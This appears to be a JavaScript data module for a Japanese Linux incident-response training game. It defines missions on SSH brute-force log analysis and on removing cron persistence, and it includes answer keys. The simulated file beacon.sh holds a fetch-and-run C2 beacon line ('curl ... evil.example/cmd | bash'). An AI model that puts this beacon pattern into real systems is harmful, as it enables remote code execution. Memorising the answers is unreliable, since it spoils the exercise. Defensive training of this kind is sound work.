// Stage 3: ログ解析とインシデント対応（総合）
export const stage3 = {
  id: 'stage3',
  title: 'Stage 3 — 侵入の痕跡を追う',
  subtitle: 'ログ・cron・ファイルを横断し、侵入経路と永続化を突き止める総合演習',
  intro: 'SOCから一次対応を引き継いだ。サーバー intra-07 で不審なアウトバウンド通信が観測されている。これまで学んだ調査・権限・プロセスの知識を総動員して、侵入の全体像を再構成する。',
  missions: [
    {
      id: 'i-01-authlog',
      title: '認証ログから侵入口を特定',
      minutes: 12,
      objectives: ['auth.log を解析する', '総当たり攻撃と最終的な成功ログインを区別する', '複数コマンドを組み合わせて集計する'],
      prereq: ['f-03-pipes', 'p-04-process'],
      briefing: 'まず「どうやって入られたか」を知る必要がある。SSHの認証ログ /var/log/auth.log に答えがある。失敗が続いた後に成功しているIPとアカウントを探し出せ。',
      concepts: [
        {
          title: '認証ログの読み方',
          why: '侵入の多くはSSH等の認証を突破して始まる。auth.log は誰がいつ成功/失敗したかを記録する一次証拠。',
          problem: '大量の "Failed password" の中に、まぎれこんだ "Accepted password"（侵入成功）を見つけたい。',
          how: 'grep "Failed password" で総当たりの痕跡、grep "Accepted" で成功ログインを抽出。awk で発信元IPやユーザー名の列を取り出し、sort|uniq -c で集計して攻撃元を割り出す。',
          example: '$ grep Accepted /var/log/auth.log\nAccepted password for backup from 203.0.113.9',
          relation: 'このミッションで侵入に成功したIPとアカウントを特定する。',
        },
      ],
      env: {
        hostname: 'intra-07', user: 'analyst',
        users: [{ name: 'backup' }],
        files: [
          { path: '/var/log/auth.log', owner: 'root', mode: 0o644, content:
`Oct 14 02:11:01 intra-07 sshd[2001]: Failed password for admin from 203.0.113.9 port 51002 ssh2
Oct 14 02:11:03 intra-07 sshd[2002]: Failed password for admin from 203.0.113.9 port 51010 ssh2
Oct 14 02:11:05 intra-07 sshd[2003]: Failed password for root from 203.0.113.9 port 51020 ssh2
Oct 14 02:11:07 intra-07 sshd[2004]: Failed password for backup from 203.0.113.9 port 51030 ssh2
Oct 14 02:11:09 intra-07 sshd[2005]: Failed password for backup from 203.0.113.9 port 51040 ssh2
Oct 14 02:11:12 intra-07 sshd[2006]: Failed password for backup from 203.0.113.9 port 51050 ssh2
Oct 14 02:11:20 intra-07 sshd[2007]: Accepted password for backup from 203.0.113.9 port 51060 ssh2
Oct 14 02:12:40 intra-07 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash
Oct 14 09:30:00 intra-07 sshd[3001]: Accepted publickey for analyst from 198.51.100.2 port 40000 ssh2
` },
        ],
      },
      quick: ['grep "Failed password" /var/log/auth.log', 'grep Accepted /var/log/auth.log', 'grep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c', 'grep backup /var/log/auth.log'],
      tasks: [
        {
          q: '"Failed password"（認証失敗）は何回記録されていますか。',
          narration: '総当たり攻撃の規模をまず掴む。grep で失敗行を抽出し件数を数える。',
          check: { type: 'answer', any: ['6', '６'] },
          hints: ['grep -c "Failed password" /var/log/auth.log', 'クォートで囲むとスペースを含む語を1つのパターンにできる', '6回失敗している'],
          explain: '短時間に6回の認証失敗が同一IPから発生。典型的なSSH総当たり。grep -c で件数を即座に把握できる。',
        },
        {
          q: '総当たりの末に、ログインに「成功」してしまったアカウント名を答えてください。',
          narration: '失敗の山の中から成功を探す。"Accepted" を含む行が成功ログイン。ただし正規ユーザーの正常ログインも混じるので、攻撃元IP(203.0.113.9)と結びつくものを選ぶ。',
          check: { type: 'answer', any: ['backup'] },
          answerHint: 'ユーザー名',
          hints: ['grep Accepted /var/log/auth.log で成功行を抽出', '攻撃元 203.0.113.9 からの Accepted 行を見る', 'backup アカウントが突破された（analyst は別IPの正常ログイン）'],
          explain: 'backup アカウントが弱いパスワードで突破された。直後に sudo で root 昇格もしている。grep Accepted と攻撃元IPの突き合わせで侵入口が確定する。正常ログイン(analyst)と区別する目を持つことが重要。',
        },
        {
          q: '侵入成功後、backup ユーザーはあるコマンドを sudo で実行して権限昇格しています。sudo のログ行に記録されている、root として実行されたコマンドの絶対パスを答えてください。',
          narration: '侵入後の行動を追う。auth.log には sudo の実行も記録される。backup が root で何を動かしたかを読み取る。',
          check: { type: 'answer', any: ['/bin/bash'] },
          answerHint: '実行されたコマンドのパス',
          hints: ['grep sudo /var/log/auth.log', 'COMMAND= の後ろを見る', 'USER=root COMMAND=/bin/bash → rootシェルを取得している'],
          explain: 'backup が sudo で /bin/bash を root として起動＝rootシェルを奪取。侵入→昇格の流れが1本のログで追えた。次は攻撃者がどう「居座ったか」(永続化)を調べる。',
        },
      ],
      review: {
        steps: ['grep -c で失敗回数を把握', 'grep Accepted で成功を抽出', '攻撃元IPと突き合わせて侵入アカウント特定', 'sudoログで昇格を確認'],
        commands: [
          { cmd: 'grep -c "Failed password" auth.log', meaning: '総当たりの規模' },
          { cmd: 'grep Accepted auth.log', meaning: '成功ログインの抽出' },
          { cmd: 'grep sudo auth.log', meaning: '権限昇格の追跡' },
        ],
        why: '「初期侵入→権限昇格」の再構成はインシデント対応の第一段階。auth.logはその一次情報。',
        practice: 'SSH総当たり対策(fail2ban・鍵認証強制)の必要性を、実ログから説明できるようになる。',
        related: ['cronによる永続化', 'タイムライン分析'],
      },
      learned: ['auth-log', 'ssh-bruteforce', 'privilege-escalation', 'log-correlation'],
      solution: ['grep -c "Failed password" /var/log/auth.log', 'grep Accepted /var/log/auth.log', 'grep sudo /var/log/auth.log'],
    },

    {
      id: 'i-02-persistence',
      title: '永続化(cron)を発見して除去',
      minutes: 13,
      objectives: ['cron設定を調査する', '悪意あるスクリプトを読む', 'バックドアを無効化する'],
      prereq: ['i-01-authlog'],
      briefing: '侵入口は分かった。次は「攻撃者がどう居座り続けているか」。多くの攻撃者は定期実行(cron)でバックドアを再起動する。cron設定を洗い、仕込まれたスクリプトを特定し、無力化せよ。',
      concepts: [
        {
          title: 'cron による永続化',
          why: 'cronは「毎分」「毎日」など定期的にコマンドを実行する仕組み。攻撃者はこれでバックドアを常に生かし続ける。',
          problem: 'プロセスを殺しても、cronが数分後に再起動すれば意味がない。cronの登録を見つけて止める必要がある。',
          how: 'システムのcronは /etc/crontab, /etc/cron.d/, 各ユーザーの /var/spool/cron/crontabs/ にある。これらを cat/grep で読み、不審なスクリプトの実体を特定して、cron行の削除やスクリプトの実行権剥奪で無効化する。',
          example: '* * * * * backup /tmp/.x/beacon.sh  ← 毎分バックドア起動',
          relation: 'このミッションでcronに仕込まれたバックドアを見つけ、無効化する。',
        },
      ],
      env: {
        hostname: 'intra-07', user: 'analyst', sudo: true,
        users: [{ name: 'backup' }],
        dirs: ['/etc/cron.d', { path: '/tmp/.x', mode: 0o777, owner: 'backup' }, '/var/spool/cron/crontabs'],
        files: [
          { path: '/etc/cron.d/backup-job', owner: 'root', mode: 0o644, content: '# 正規の日次バックアップ\n0 3 * * * root /usr/local/bin/backup.sh\n' },
          { path: '/var/spool/cron/crontabs/backup', owner: 'backup', group: 'crontab', mode: 0o600, content: '# m h dom mon dow command\n*/2 * * * * /tmp/.x/beacon.sh >/dev/null 2>&1\n' },
          { path: '/tmp/.x/beacon.sh', owner: 'backup', mode: 0o755, content: '#!/bin/bash\n# C2 beacon\nwhile true; do\n  curl -s http://evil.example/cmd | bash\n  sleep 60\ndone\n' },
          { path: '/usr/local/bin/backup.sh', owner: 'root', mode: 0o750, content: '#!/bin/bash\ntar czf /srv/backup/data.tgz /srv/data\n' },
        ],
      },
      quick: ['cat /etc/crontab', 'cat /etc/cron.d/backup-job', 'cat /var/spool/cron/crontabs/backup', 'cat /tmp/.x/beacon.sh', 'crontab -l', 'rm /tmp/.x/beacon.sh'],
      tasks: [
        {
          q: 'backup ユーザーのcrontab(/var/spool/cron/crontabs/backup)に仕込まれた、2分ごとに実行されるスクリプトの絶対パスを答えてください。',
          narration: 'ユーザー別のcronは /var/spool/cron/crontabs/ 以下にある。backup のファイルを読んで、何を・どの頻度で実行しているか確認する。*/2 は「2分ごと」の意味。',
          check: { type: 'answer', any: ['/tmp/.x/beacon.sh'] },
          answerHint: '実行されるスクリプトのパス',
          hints: ['cat /var/spool/cron/crontabs/backup', '*/2 * * * * の後ろのコマンドを見る', '/tmp/.x/beacon.sh が2分ごとに起動されている'],
          explain: '/tmp の隠しディレクトリにあるスクリプトを2分ごとに実行＝明確なバックドア。cron行の */2 * * * * は「2分間隔」。/tmp 配下や隠しディレクトリからの定期実行は強い侵害指標(IoC)。',
        },
        {
          q: 'そのスクリプトの中身を読み、攻撃者が通信している外部C2サーバーのホスト名を答えてください（http:// や パスは除く）。',
          narration: 'スクリプトの実体を読むと攻撃の意図が分かる。beacon.sh を cat して、どこへ通信しているかを確認する。',
          check: { type: 'answer', any: ['evil.example'], ci: true },
          answerHint: '例: host.example',
          hints: ['cat /tmp/.x/beacon.sh', 'curl している URL を見る', 'http://evil.example/cmd の「evil.example」がC2ホスト'],
          explain: 'curl http://evil.example/cmd | bash は「C2サーバーからコマンドを取得して実行」する典型的なビーコン。evil.example をIoCとして記録し、ネットワーク側でも遮断する。|bash は受信内容を無検証で実行する極めて危険なパターン。',
        },
        {
          q: 'このバックドアを無効化します。beacon.sh を削除してください（cronが実行する実体を断つ）。削除後 done と入力。',
          narration: '無力化の方法は複数ある（cron行の削除・実行権剥奪・スクリプト削除）。ここではバックドア本体の beacon.sh を削除して、cronが起動する対象そのものを消す。',
          check: { type: 'state', path: '/tmp/.x/beacon.sh', exists: false },
          answerHint: '削除したら done',
          hints: ['rm で削除する', 'rm /tmp/.x/beacon.sh', 'ls /tmp/.x で消えたか確認し done と入力'],
          explain: 'バックドア本体を削除すればcronは実行対象を失う。実務ではさらにcron行自体も除去し、侵入経路(弱いパスワード)を塞ぎ、backupアカウントを無効化・パスワード再設定する。1箇所直して終わりにせず、侵入→昇格→永続化の全段を潰すのが正しい封じ込め。',
        },
      ],
      review: {
        steps: ['/etc/cron* と /var/spool/cron を調査', '不審スクリプトの実体を cat で解析', 'C2ホストをIoCとして記録', '本体を削除して永続化を断つ'],
        commands: [
          { cmd: 'cat /var/spool/cron/crontabs/backup', meaning: 'ユーザーcronの確認' },
          { cmd: 'cat /tmp/.x/beacon.sh', meaning: 'バックドアの中身を解析' },
          { cmd: 'rm /tmp/.x/beacon.sh', meaning: 'バックドア本体を除去' },
        ],
        why: '永続化の除去は封じ込めの要。cronは最も一般的な永続化手段のひとつで、必ず確認する。',
        practice: '実インシデントでcron・systemd・rc.localを横断して永続化を洗い出す手順に直結。',
        related: ['systemdによる永続化', 'ネットワーク遮断', '根本原因分析'],
      },
      learned: ['cron', 'persistence-removal', 'c2-beacon', 'ioc', 'incident-containment'],
      solution: ['cat /var/spool/cron/crontabs/backup', 'cat /tmp/.x/beacon.sh', 'rm /tmp/.x/beacon.sh'],
    },
  ],
};
